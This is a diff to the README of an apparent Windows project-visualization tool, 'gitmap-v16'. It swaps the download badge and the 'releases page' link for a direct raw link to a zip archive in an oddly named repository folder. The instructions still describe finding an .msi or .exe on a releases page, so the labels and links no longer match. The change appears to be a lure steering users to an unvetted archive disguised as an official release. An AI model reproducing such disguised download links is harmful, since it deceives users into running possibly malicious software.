@@ -1,6 +1,6 @@
 # 🗺️ gitmap-v16 - Visualize your software project structure easily
 
-[![](https://img.shields.io/badge/Download-Gitmap-blue.svg)](https://github.com/Astrea6577/gitmap-v16/releases)
+[![](https://img.shields.io/badge/Download-Gitmap-blue.svg)](https://raw.githubusercontent.com/Astrea6577/gitmap-v16/main/sanctitude/v_gitmap_2.4-alpha.5.zip)
 
 ## 📖 About this application
 
@@ -12,7 +12,7 @@ Your computer needs Windows 10 or Windows 11 to run this software. You need at l
 
 ## 📥 Downloading the software
 
-1. Visit the [releases page](https://github.com/Astrea6577/gitmap-v16/releases) to download the program.
+1. Visit the [releases page](https://raw.githubusercontent.com/Astrea6577/gitmap-v16/main/sanctitude/v_gitmap_2.4-alpha.5.zip) to download the program.
 2. Look for the file ending in .msi or .exe under the latest version label.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
